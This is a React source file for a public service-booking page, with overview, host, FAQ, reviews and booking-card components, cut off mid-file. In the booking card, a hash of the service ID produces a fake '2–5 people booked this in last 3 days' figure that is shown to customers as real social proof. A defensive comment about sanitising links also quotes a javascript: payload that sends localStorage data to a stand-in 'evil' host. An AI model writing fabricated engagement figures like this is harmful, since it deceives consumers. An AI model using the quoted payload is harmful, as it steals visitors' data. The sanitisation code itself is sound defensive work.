/**
 * ServiceDetail — public service page at /:username/:slug
 * Sections: Hero · Tabs (Overview, Deliverables, Host, FAQ, How it Works, Reviews) · Sticky sidebar
 */
import { useState, useEffect, useLayoutEffect, useRef } from 'react';
import { useParams, Link, useNavigate } from 'react-router-dom';
import DOMPurify from 'dompurify';
import { svcGetPublicByProfile, getAvailableSlots } from '../services/api';
import { applyProfileTheme, isValidHex, DEFAULT_THEME_COLOR } from '../utils/themeUtils';
import Seo from '../components/common/Seo';
import ErrorPage from './ErrorPage';
import TransientError from '../components/error/TransientError';
import { isNotFoundError } from '../utils/fetchError';
import { useMinimalFooter } from '../context/ChromeContext';
import { resolveServiceSeo, serviceJsonLd, breadcrumbJsonLd, faqJsonLd, SITE_URL } from '../utils/seo';
import { serviceFaqs } from '../utils/serviceFaqs';
import PetalSpinner from '../components/common/PetalSpinner';
import { prerendered } from '../services/prerenderData';

// Production base for canonical/OG (Vercel env overrides the apex default).
const SEO_SITE = import.meta.env?.VITE_PUBLIC_SITE_URL || SITE_URL;

// Sanitize vendor-supplied rich text before rendering as HTML. Strips <script>,
// event handlers (onerror/onload/…), javascript:/data: URLs, <iframe>, etc.
// SECURITY: long_description is vendor-controlled and shown on a public page —
// rendering it raw is stored XSS against every guest/host who views it.
const sanitizeHtml = (dirty) =>
  DOMPurify.sanitize(String(dirty || ''), { USE_PROFILES: { html: true } });

// ─── Helpers ─────────────────────────────────────────────────────────────────

const fmtDuration = (min) => {
  if (!min) return '—';
  if (min < 60) return `${min} min`;
  const h = Math.floor(min / 60), m = min % 60;
  return m ? `${h}h ${m}m` : `${h}h`;
};

// "14:30" → "2:30 PM". Slots come back from the API as 24h "HH:MM" strings.
const fmt12 = (hhmm) => {
  const [h, m] = String(hhmm).split(':').map(Number);
  if (Number.isNaN(h)) return hhmm;
  const ap = h >= 12 ? 'PM' : 'AM';
  const h12 = ((h + 11) % 12) + 1;
  return `${h12}:${String(m || 0).padStart(2, '0')} ${ap}`;
};

// Friendly label for a date relative to today: Today / Tomorrow / "Wed".
const dayLabel = (d) => {
  const today = new Date(); today.setHours(0, 0, 0, 0);
  const dd = new Date(d); dd.setHours(0, 0, 0, 0);
  const diff = Math.round((dd - today) / 86400000);
  if (diff === 0) return 'Today';
  if (diff === 1) return 'Tomorrow';
  return dd.toLocaleDateString('en-IN', { weekday: 'short' });
};

// "Jun 25" sub-label under the day name.
const shortDate = (d) =>
  new Date(d).toLocaleDateString('en-IN', { month: 'short', day: 'numeric' });

// Map the service type enum to a human label for the hero eyebrow.
const TYPE_LABEL = { '1-on-1': '1:1 Session', group: 'Group Session', paid_dm: 'Priority DM' };

const Stars = ({ avg, count, size = 'sm' }) => {
  const sz = size === 'lg' ? 'w-5 h-5' : 'w-4 h-4';
  return (
    <div className="flex items-center gap-1">
      {[1,2,3,4,5].map(s => (
        <svg key={s} className={`${sz} ${s <= Math.round(avg) ? 'text-amber-400' : 'text-gray-200'}`} fill="currentColor" viewBox="0 0 20 20">
          <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
        </svg>
      ))}
      {count > 0 && <span className="text-xs text-gray-500 ml-1">{avg?.toFixed(1)} ({count})</span>}
    </div>
  );
};

// ─── Social icons — outline (linear) set, monochrome ──────────────────────────
const SOCIAL_ICONS = {
  instagram: <><rect x="2" y="2" width="20" height="20" rx="5" ry="5" /><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" /><line x1="17.5" y1="6.5" x2="17.51" y2="6.5" /></>,
  youtube: <><path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z" /><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02" /></>,
  linkedin: <><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" /><rect x="2" y="9" width="4" height="12" /><circle cx="4" cy="4" r="2" /></>,
  facebook: <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />,
  twitter:  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />,
  whatsapp: <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />,
  website: <><circle cx="12" cy="12" r="10" /><line x1="2" y1="12" x2="22" y2="12" /><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" /></>,
  github: <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />,
  email: <><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" /><polyline points="22,6 12,13 2,6" /></>,
};
const SOCIAL_ORDER = ['instagram', 'youtube', 'linkedin', 'facebook', 'twitter', 'whatsapp', 'website', 'github', 'email'];

// Sanitize a vendor-supplied social link before using it as an href. social_links
// are vendor-controlled — a value like `javascript:fetch('//evil/?c='+localStorage.user)`
// would be stored XSS against any visitor who clicks it. Allow only http(s) links
// (and mailto: for a valid email); anything else collapses to a harmless '#'.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const safeUrl = (value, isEmail = false) => {
  const v = String(value || '').trim();
  if (isEmail) {
    const addr = v.replace(/^mailto:/i, '');
    return EMAIL_RE.test(addr) ? `mailto:${addr}` : '#';
  }
  return /^https?:\/\//i.test(v) ? v : '#';
};

const SocialIcon = ({ platform, href }) => {
  const icon = SOCIAL_ICONS[platform];
  if (!icon || !href) return null;
  const cleanHref = safeUrl(href, platform === 'email');
  if (cleanHref === '#') return null;
  return (
    <a href={cleanHref} target="_blank" rel="noreferrer"
      className="flex items-center justify-center flex-shrink-0 text-gray-500 border border-gray-200 rounded-lg hover:text-gray-900 hover:border-gray-300 hover:bg-gray-50 transition-colors"
      style={{ width: 34, height: 34 }}
      title={platform.charAt(0).toUpperCase() + platform.slice(1)}>
      <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
        {icon}
      </svg>
    </a>
  );
};

// Service-meta label for the booking card — "30 Minutes", "1h 30m", etc.
const fmtMetaDuration = (min) => {
  if (!min) return '—';
  if (min < 60) return `${min} Minutes`;
  return fmtDuration(min);
};

// ─── Tab components ───────────────────────────────────────────────────────────

const COLLAPSED_H = 320;

const OverviewTab = ({ html }) => {
  const [expanded, setExpanded] = useState(false);
  const ref = useRef(null);
  const clean = sanitizeHtml(html);
  const [tall, setTall] = useState(false);
  const [fullH, setFullH] = useState(0);

  // Measure full content height so max-height can animate to a real px value
  // (CSS can't transition to `auto`). useLayoutEffect so the collapse is applied
  // BEFORE paint — a plain useEffect measures after paint and snaps the height,
  // which is a visible CLS jump on this prerendered ad-landing page.
  useLayoutEffect(() => {
    const measure = () => {
      if (!ref.current) return;
      const h = ref.current.scrollHeight;
      setFullH(h);
      setTall(h > COLLAPSED_H);
    };
    measure();
    window.addEventListener('resize', measure);
    return () => window.removeEventListener('resize', measure);
  }, [clean]);

  if (!clean) return <p className="text-gray-400 text-sm">No overview provided.</p>;

  return (
    <div className="relative">
      <div
        ref={ref}
        className="prose prose-sm max-w-none text-gray-700 overflow-hidden transition-[max-height] duration-500 ease-in-out"
        style={{ maxHeight: tall ? (expanded ? fullH : COLLAPSED_H) : undefined }}
        dangerouslySetInnerHTML={{ __html: clean }}
      />
      {tall && (
        <div
          className={`pointer-events-none absolute bottom-0 left-0 right-0 h-20 bg-gradient-to-t from-white to-transparent transition-opacity duration-300 ${expanded ? 'opacity-0' : 'opacity-100'}`}
        />
      )}
      {tall && (
        <button onClick={() => setExpanded(e => !e)}
          className="mt-3 text-sm font-medium text-primary hover:underline flex items-center gap-1">
          {expanded ? 'Show Less' : 'Show More'}
          <svg className={`w-4 h-4 transition-transform duration-300 ${expanded ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7"/>
          </svg>
        </button>
      )}
    </div>
  );
};

const DeliverablesTab = ({ included = [], excluded = [] }) => (
  <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
    <div>
      <h3 className="text-sm font-bold text-gray-800 mb-3 flex items-center gap-2">
        <span className="w-5 h-5 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-xs">✓</span>
        What's Included
      </h3>
      {included.length === 0
        ? <p className="text-xs text-gray-400">Not specified</p>
        : <div className="flex flex-wrap gap-2">
            {included.map((item, i) => (
              <span key={i} className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-green-50 border border-green-200 text-green-800 text-xs font-medium">
                <svg className="w-3 h-3 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7"/></svg>
                {item}
              </span>
            ))}
          </div>
      }
    </div>
    <div>
      <h3 className="text-sm font-bold text-gray-800 mb-3 flex items-center gap-2">
        <span className="w-5 h-5 rounded-full bg-red-100 text-red-600 flex items-center justify-center text-xs">✕</span>
        Not Included
      </h3>
      {excluded.length === 0
        ? <p className="text-xs text-gray-400">Not specified</p>
        : <div className="flex flex-wrap gap-2">
            {excluded.map((item, i) => (
              <span key={i} className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-50 border border-red-200 text-red-800 text-xs font-medium">
                <svg className="w-3 h-3 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M6 18L18 6M6 6l12 12"/></svg>
                {item}
              </span>
            ))}
          </div>
      }
    </div>
  </div>
);

const HostTab = ({ vendor, totalServices, totalBookings = 0 }) => {
  if (!vendor?.name) return <p className="text-gray-400 text-sm">No host info.</p>;
  return (
    <div className="flex flex-col sm:flex-row gap-5 items-start">
      <div className="flex-shrink-0">
        {vendor.profile_image
          ? <img src={vendor.profile_image} alt={vendor.name} className="w-20 h-20 rounded-2xl object-cover border-2 border-white shadow-md"/>
          : <div className="w-20 h-20 rounded-2xl bg-primary/10 flex items-center justify-center text-3xl font-bold text-primary">{vendor.name.charAt(0)}</div>}
      </div>
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2 mb-1">
          <h3 className="text-lg font-bold text-gray-900">{vendor.name}</h3>
          {vendor.is_verified && (
            <svg className="w-5 h-5 flex-shrink-0" viewBox="0 0 24 24" fill="none" aria-label="Verified" style={{ transform: 'translate(-2px, 1px)' }}>
              <path className="fill-primary" d="M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 0 1-1.043 3.296 3.745 3.745 0 0 1-3.296 1.043A3.745 3.745 0 0 1 12 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 0 1-3.296-1.043 3.745 3.745 0 0 1-1.043-3.296A3.745 3.745 0 0 1 3 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 0 1 1.043-3.296 3.746 3.746 0 0 1 3.296-1.043A3.746 3.746 0 0 1 12 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 0 1 3.296 1.043 3.746 3.746 0 0 1 1.043 3.296A3.745 3.745 0 0 1 21 12Z"/>
              <path d="M8.5 12.5l2.25 2.25L15.5 10" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          )}
        </div>
        {(vendor.profession || vendor.tagline) && (
          <p className="text-sm text-primary font-medium mb-2">{vendor.profession || vendor.tagline}</p>
        )}
        {vendor.bio && <p className="text-sm text-gray-600 mb-3 leading-relaxed">{vendor.bio}</p>}
        <div className="flex flex-wrap gap-4 text-xs text-gray-500 mb-4">
          <span><strong className="text-gray-800">{totalServices}</strong> services</span>
          <span><strong className="text-gray-800">{totalBookings}</strong> bookings</span>
        </div>
        {vendor.username && (
          <Link to={`/${vendor.username}`}
            className="inline-flex items-center gap-1.5 text-sm font-medium text-primary hover:underline">
            Visit Profile
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
          </Link>
        )}
      </div>
    </div>
  );
};

// ─── How it Works — generic 4-step explainer, derived from service shape ──────
const HowItWorksTab = ({ duration, online = true }) => {
  const mins = duration ? `${duration} focused minutes` : 'A focused session';
  const steps = [
    { t: 'Book your slot',
      d: duration ? `Pick a ${duration}-minute time that fits your schedule.` : 'Pick a time that fits your schedule.' },
    { t: 'Share context',
      d: 'A quick form so we skip the small talk and dive straight in.' },
    { t: 'The session',
      d: online ? `${mins}, 1:1 on Google Meet.` : `${mins}, in person at the host's location.` },
    { t: 'Follow-up',
      d: 'A short summary and clear next steps, sent after the session.' },
  ];
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-x-6 gap-y-7">
      {steps.map((s, i) => (
        <div key={i}>
          <div className="h-0.5 w-full rounded-full mb-3"
            style={{ background: 'color-mix(in srgb, var(--profile-accent, #960D32) 35%, #e5e7eb)' }}/>
          <div className="text-lg font-black mb-1.5" style={{ color: 'var(--profile-accent, #960D32)' }}>{i + 1}</div>
          <h4 className="text-sm font-bold text-gray-900 mb-1">{s.t}</h4>
          <p className="text-sm text-gray-500 leading-relaxed">{s.d}</p>
        </div>
      ))}
    </div>
  );
};

// ─── Available Slots preview — real server slots, next 2 open days × 2 each ────
// Self-contained: fetches only when mounted (i.e. when the Host tab is shown on
// desktop, or inline on mobile). Scans up to 7 days, stops at 2 with openings.
const AvailableSlotsPreview = ({ hostId, serviceId, onViewAll }) => {
  const [days, setDays] = useState(null); // null = loading · [] = none found

  useEffect(() => {
    let cancelled = false;
    (async () => {
      if (!hostId || !serviceId) { setDays([]); return; }
      const found = [];
      const today = new Date(); today.setHours(0, 0, 0, 0);
      for (let i = 0; i < 7 && found.length < 2; i++) {
        const d = new Date(today); d.setDate(today.getDate() + i);
        const dateStr = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
        try {
          const { data } = await getAvailableSlots(hostId, serviceId, dateStr);
          const slots = Array.isArray(data?.slots) ? data.slots : [];
          if (slots.length) found.push({ date: d, slots: slots.slice(0, 2) });
        } catch { /* skip this day, keep scanning */ }
      }
      if (!cancelled) setDays(found);
    })();
    return () => { cancelled = true; };
  }, [hostId, serviceId]);

  return (
    <div className="mt-6 pt-6 border-t border-gray-100">
      <div className="flex items-center justify-between mb-4">
        <h3 className="text-sm font-bold text-gray-900">Available slots</h3>
        <button onClick={onViewAll} className="text-sm font-medium hover:underline"
          style={{ color: 'var(--profile-accent, #960D32)' }}>
          View all →
        </button>
      </div>
      {days === null ? (
        <div className="flex gap-2">
          {[0, 1].map(i => <div key={i} className="h-14 flex-1 rounded-xl bg-gray-100 animate-pulse"/>)}
        </div>
      ) : days.length === 0 ? (
        <p className="text-sm text-gray-400">No open slots in the next few days — tap “View all” for the full calendar.</p>
      ) : (
        <div className="space-y-3">
          {days.map(({ date, slots }) => (
            <div key={date.toISOString()} className="flex items-center gap-3">
              <div className="w-20 flex-shrink-0">
                <div className="text-sm font-semibold text-gray-900">{dayLabel(date)}</div>
                <div className="text-xs text-gray-400">{shortDate(date)}</div>
              </div>
              <div className="flex flex-wrap gap-2">
                {slots.map(t => (
                  <button key={t} onClick={onViewAll}
                    className="btn btn--outline px-3.5 py-1.5 text-sm font-medium hover:border-gray-300">
                    {fmt12(t)}
                  </button>
                ))}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

const FAQTab = ({ faqs = [] }) => {
  const [open, setOpen] = useState(null);
  if (faqs.length === 0) return <p className="text-gray-400 text-sm">No FAQs provided.</p>;
  return (
    <div className="divide-y divide-gray-100">
      {faqs.map((faq, i) => (
        <div key={i} className="py-4">
          <button onClick={() => setOpen(open === i ? null : i)}
            className="w-full flex items-center justify-between gap-3 text-left">
            <span className="text-sm font-semibold text-gray-800">{faq.question}</span>
            <svg className={`w-5 h-5 flex-shrink-0 text-gray-400 transition-transform ${open === i ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7"/>
            </svg>
          </button>
          {open === i && <p className="mt-3 text-sm text-gray-600 leading-relaxed pr-8">{faq.answer}</p>}
        </div>
      ))}
    </div>
  );
};

const ReviewsTab = ({ reviews = [], avgRating, ratingBreakdown = [] }) => {
  const total = reviews.length;
  const avg = avgRating || 0;
  // Always show the summary — fall back to an empty 5→1 breakdown when no reviews
  const breakdown = ratingBreakdown.length
    ? ratingBreakdown
    : [5, 4, 3, 2, 1].map(star => ({ star, count: 0 }));
  const accent = 'var(--profile-accent, #960D32)';
  return (
    <div>
      {/* Summary — score + per-star bars clubbed into one tinted panel */}
      <div className="flex flex-col sm:flex-row items-stretch gap-5 rounded-2xl p-5 mb-6"
        style={{ background: `color-mix(in srgb, ${accent} 7%, white)` }}>
        {/* Score */}
        <div className="flex flex-shrink-0 flex-col items-center justify-center text-center sm:border-r sm:pr-6"
          style={{ borderColor: `color-mix(in srgb, ${accent} 16%, white)` }}>
          <div className="text-5xl font-black leading-none text-gray-900">{avg.toFixed(1)}</div>
          <div className="mt-2 flex gap-0.5">
            {[1,2,3,4,5].map(s => (
              <svg key={s} className="w-3.5 h-3.5" style={{ color: s <= Math.round(avg) ? accent : '#e5d9d2' }} fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
            ))}
          </div>
          <p className="mt-1.5 text-xs text-gray-500">{total} review{total === 1 ? '' : 's'}</p>
        </div>
        {/* Per-star bars */}
        <div className="flex flex-1 flex-col justify-center gap-1.5">
          {breakdown.map(({star, count}) => {
            const pct = total ? Math.round((count / total) * 100) : 0;
            return (
              <div key={star} className="flex items-center gap-2">
                <span className="w-3 text-right text-xs font-medium text-gray-500">{star}</span>
                <svg className="w-3 h-3 flex-shrink-0" style={{ color: accent }} fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
                <div className="h-2 flex-1 overflow-hidden rounded-full bg-white">
                  <div className="h-full rounded-full transition-all" style={{ width: `${pct}%`, background: accent }}/>
                </div>
                <span className="w-9 text-right text-xs text-gray-500">{pct}%</span>
              </div>
            );
          })}
        </div>
      </div>
      {/* Testimonials — quote cards under the summary */}
      {total === 0
        ? <p className="text-gray-400 text-sm">No reviews yet.</p>
        : <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            {reviews.map(r => (
              <div key={r.id} className="flex flex-col rounded-2xl border border-gray-100 bg-white p-5">
                <div className="mb-3 flex gap-0.5">
                  {[1,2,3,4,5].map(s => (
                    <svg key={s} className="w-3.5 h-3.5" style={{ color: s <= Math.round(r.rating) ? accent : '#e5e7eb' }} fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
                  ))}
                </div>
                {r.comment && <p className="flex-1 text-sm leading-relaxed text-gray-700">“{r.comment}”</p>}
                <div className="mt-4 flex items-center gap-2.5 border-t border-gray-50 pt-3">
                  <div className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full text-xs font-bold"
                    style={{ background: `color-mix(in srgb, ${accent} 12%, white)`, color: accent }}>
                    {r.profiles?.name?.charAt(0) || '?'}
                  </div>
                  <div className="min-w-0">
                    <div className="truncate text-sm font-semibold text-gray-900">{r.profiles?.name || 'Anonymous'}</div>
                    <div className="text-xs text-gray-400">
                      {new Date(r.created_at).toLocaleDateString('en-IN',{day:'numeric',month:'short',year:'numeric'})}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
      }
    </div>
  );
};

// ─── Booking Card (sticky sidebar on desktop, block on mobile) ────────────────

// Stable pseudo-random number 2–5 per service (deterministic from ID).
const socialProofCount = (id) => {
  let h = 0;
  const s = String(id || '');
  for (let i = 0; i < s.length; i++) h = ((h << 5) - h + s.charCodeAt(i)) | 0;
  return (Math.abs(h) % 4) + 2;
};

// Conversion-focused trust signals shown under the CTA.
const TRUST_SIGNALS = [
  { key: 'verified',  label: 'Verified host',
    path: 'M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z' },
  { key: 'instant',   label: 'Instant confirmation',
    path: 'M13 10V3L4 14h7v7l9-11h-7z' },
];

const BookingCard = ({ service, onBookNow, bookingFee = 0, bookingFeeBreakdown = { platformFee: 0, tax: 0 }, compact = false, motionOK = true }) => {
  const priceOnRequest = service.price_on_request === true;
  const isFree = service.price === 0;
  const [feeTipOpen, setFeeTipOpen] = useState(false);

  const imgWrapRef = useRef(null);
  const [imgH, setImgH] = useState(0);
  // useLayoutEffect: reserve the image height before paint to avoid a CLS jump.
  useLayoutEffect(() => {
    if (imgWrapRef.current) setImgH(imgWrapRef.current.scrollHeight);
  }, [service.thumbnail_url]);

  const { platformFee = 0, tax = 0 } = bookingFeeBreakdown || {};
  const total = service.price + bookingFee;
  const recentBookers = socialProofCount(service.id);

  return (
    <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
      {/* Thumbnail — collapses on scroll past hero */}
      <div
        ref={imgWrapRef}
        aria-hidden={compact}
        className="overflow-hidden"
        style={{
          maxHeight: compact ? 0 : (imgH || 240),
          opacity: compact ? 0 : 1,
          transition: motionOK
            ? 'max-height 280ms cubic-bezier(0.4,0,0.2,1), opacity 200ms ease'
            : 'none',
        }}
      >
        <img src={service.thumbnail_url || '/service-og-default.jpg'} alt={service.title}
             className="w-full aspect-[16/10] object-cover"/>
      </div>
      <div className="p-5">
        {/* Pricing — service price + platform fee & tax breakdown */}
        <div className="mb-1">
          {priceOnRequest ? (
            <div className="text-2xl font-black text-gray-900 leading-none">Price on request</div>
          ) : isFree ? (
            <div className="text-3xl font-black text-gray-900 leading-none">Free</div>
          ) : (
            <>
              <div className="flex items-baseline gap-2">
                <span className="text-3xl font-black text-gray-900 leading-none">₹{service.price}</span>
              </div>
              {bookingFee > 0 && (
                <p className="relative mt-1.5 flex items-center gap-1 text-xs text-gray-500">
                  <span>+ ₹{bookingFee} platform fee &amp; tax</span>
                  <button type="button" onClick={() => setFeeTipOpen(o => !o)} aria-label="View fee breakdown"
                    className="text-gray-400 hover:text-gray-600 transition-colors">
                    <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="9"/><path strokeLinecap="round" d="M12 16v-4M12 8.5h.01"/>
                    </svg>
                  </button>
                  {feeTipOpen && (
                    <>
                      <button type="button" aria-hidden tabIndex={-1}
                        className="fixed inset-0 z-10 cursor-default" onClick={() => setFeeTipOpen(false)}/>
                      <div className="absolute z-20 left-0 top-full mt-2 w-64 rounded-xl border border-gray-200 bg-white text-gray-700 text-xs leading-relaxed p-3.5 shadow-xl">
                        <span className="absolute -top-1.5 left-6 w-3 h-3 rotate-45 border-l border-t border-gray-200 bg-white"/>
                        <p className="mb-2 font-semibold text-gray-900">Price breakdown</p>
                        <div className="space-y-1.5">
                          <div className="flex items-center justify-between">
                            <span>Service price</span><span className="font-medium text-gray-900">₹{service.price}</span>
                          </div>
                          <div className="flex items-center justify-between">
                            <span>Platform fee</span><span className="font-medium text-gray-900">₹{platformFee}</span>
                          </div>
                          <div className="flex items-center justify-between">
                            <span>Tax (GST)</span><span className="font-medium text-gray-900">₹{tax}</span>
                          </div>
                          <div className="mt-1.5 flex items-center justify-between border-t border-gray-100 pt-1.5">
                            <span className="font-semibold text-gray-900">Total</span>
                            <span className="font-bold text-gray-900">₹{total.toFixed(2)}</span>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                </p>
              )}
            </>
          )}
        </div>

        {/* Primary CTA */}
        <button onClick={onBookNow}
          className="btn cta-press w-full py-3.5 font-bold text-sm mt-4">
          Book a Slot
        </button>

        {/* Guest policies agreement — directly under the CTA */}
        <p className="mt-3 text-[11px] text-gray-400 leading-relaxed">
          By proceeding, you agree to our{' '}
          <Link to="/terms" className="underline hover:text-gray-600 transition-colors">Guest Policies</Link>.
        </p>

        {/* Trust indicators */}
        <ul className="mt-5 pt-5 border-t border-gray-100 space-y-3 leading-5">
          {TRUST_SIGNALS.map(({ key, label, path }) => (
            <li key={key} className="flex items-start gap-2.5 text-xs text-gray-600">
              <svg className="w-4 h-4 flex-shrink-0 text-green-500 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={path}/>
              </svg>
              <span>{label}</span>
            </li>
          ))}

          {/* Social proof */}
          <li className="flex items-start gap-2.5 text-xs text-gray-600">
            <svg className="w-4 h-4 flex-shrink-0 text-orange-500 mt-0.5" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/>
            </svg>
            <span><strong className="text-gray-800">{recentBookers}</strong> people booked this in last 3 days</span>
          </li>

          {/* Safety */}
          <li className="flex items-start gap-2.5 text-xs text-gray-600">
            <svg className="w-4 h-4 flex-shrink-0 text-green-500 mt-0.5" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
            </svg>
            <span>Follow safety measures advised at the venue</span>
          </li>
        </ul>
      </div>
    </div>
  );
};

// ─── Sponsored slot — subtle native ad placeholder under the booking card ──────
const AdSpaceCard = () => (
  <div className="rounded-2xl border border-dashed border-gray-300 bg-white px-5 py-6 text-center">
    <p className="text-[10px] font-semibold uppercase tracking-[0.14em] text-gray-400">Sponsored</p>
